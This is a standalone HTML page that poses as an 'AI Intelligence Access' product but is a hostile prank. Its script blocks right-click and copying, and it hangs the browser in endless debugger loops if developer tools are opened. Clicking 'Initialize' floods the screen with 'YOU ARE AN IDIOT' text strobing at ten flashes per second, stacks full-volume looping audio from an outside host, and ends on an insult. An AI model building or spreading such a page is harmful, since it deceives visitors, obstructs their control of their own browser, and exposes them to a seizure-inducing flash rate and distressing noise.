<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI Intelligence Access</title>
<style>
  html, body {
    height: 100%;
    margin: 0;
    background: radial-gradient(circle at center, #0f0f0f, #000);
    color: white;
    font-family: "Poppins", sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }

  .container {
    text-align: center;
    animation: fadeIn 2s ease;
  }

  h1 {
    font-size: 3em;
    margin-bottom: 0.3em;
    background: linear-gradient(90deg, cyan, magenta, violet);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  p {
    color: #bbb;
    font-size: 1.2em;
  }

  .btn {
    margin-top: 1.5em;
    padding: 15px 40px;
    font-size: 1.2em;
    font-weight: 600;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    color: white;
    background: linear-gradient(90deg, #00c6ff, #0072ff);
    box-shadow: 0 0 20px #0072ff80;
    transition: 0.3s;
  }

  .btn:hover {
    transform: scale(1.08);
    box-shadow: 0 0 35px #00c6ff;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: scale(0.9); }
    to { opacity: 1; transform: scale(1); }
  }

  .idiot {
    position: absolute;
    font-family: "Arial Black", sans-serif;
    font-size: 7vw;
    text-align: center;
    color: white;
    animation: flash 0.1s infinite alternate;
    aspect-ratio: 16 / 10;
    user-select: none;
    white-space: nowrap;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-shadow: 0 0 10px white;
    background: black;
  }

  .face {
    font-size: 13vw;
    line-height: 1;
  }

  @keyframes flash {
    0% { color: white; background: black; }
    100% { color: black; background: white; }
  }

  body {
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    pointer-events: auto;
  }
</style>
</head>
<body>
  <div class="container" id="intro">
    <h1>AI Intelligence Access</h1>
    <p>Unlock the next generation of adaptive intelligence.<br>Press below to initialize system.</p>
    <button class="btn" onclick="activate()">Initialize</button>
  </div>

  <script>
    document.addEventListener('contextmenu', event => event.preventDefault());
    document.addEventListener('keydown', event => {
        if ((event.ctrlKey || event.metaKey) && (event.key === 'c' || event.key === 'C')) {
            event.preventDefault();
            return false;
        }
    });

    document.addEventListener('keydown', event => {
        if ((event.ctrlKey || event.metaKey) && (event.key === 'x' || event.key === 'X')) {
            event.preventDefault();
            return false;
        }
    });

    document.addEventListener('dragstart', event => event.preventDefault());

    function antiDevToolsStrong() {
        (function() {
            function check() {
                if (window.outerHeight - window.innerHeight > 150 || window.outerWidth - window.innerWidth > 150) {
                    while(true) { 
                        debugger; 
                    }
                }
                
                const before = new Date().getTime();
                (function(){}).constructor("debugger")();
                const after = new Date().getTime();
                if (after - before > 100) {
                    while(true) { 
                        debugger; 
                    }
                }
            }
            setInterval(check, 100);
            check();
        })();
    }
   
    antiDevToolsStrong();

    function activate() {
      document.body.innerHTML = `
        <div class="idiot">
          YOU ARE AN IDIOT
          <div class="face">â˜» â˜» â˜»</div>
        </div>
      `;

      const start = Date.now();
      const duration = 60 * 1000;
      const audios = [];

      function playNewAudio() {
        const audio = new Audio("https://c.termai.cc/a48/SpDaAl.opus");
        audio.volume = 1.0;
        audio.loop = true;
        audio.play();
        audios.push(audio);
      }

      playNewAudio();

      const soundInterval = setInterval(() => {
        playNewAudio();
      }, 3000);

      const cloneInterval = setInterval(() => {
        const elapsed = Date.now() - start;
        if (elapsed >= duration) {
          clearInterval(cloneInterval);
          clearInterval(soundInterval);
          audios.forEach(a => a.pause());
          document.body.innerHTML =
            "<h1 style='color:white;text-align:center;margin-top:40vh;font-family:sans-serif;'>Are you the fucking idiot ðŸ˜‚</h1>";
          return;
        }

        const clone = document.createElement('div');
        clone.className = 'idiot';
        clone.innerHTML = 'YOU ARE AN IDIOT<br><div class="face">â˜» â˜» â˜»</div>';

        const randomRotation = Math.floor(Math.random() * 360);
        const randomScale = 0.8 + Math.random() * 0.7;
        const randomX = Math.random() * 100;
        const randomY = Math.random() * 100;

        clone.style.top = randomY + '%';
        clone.style.left = randomX + '%';
        clone.style.transform = `translate(-50%, -50%) rotate(${randomRotation}deg) scale(${randomScale})`;

        document.body.appendChild(clone);
      }, 180);
    }
  </script>
</body>
</html>
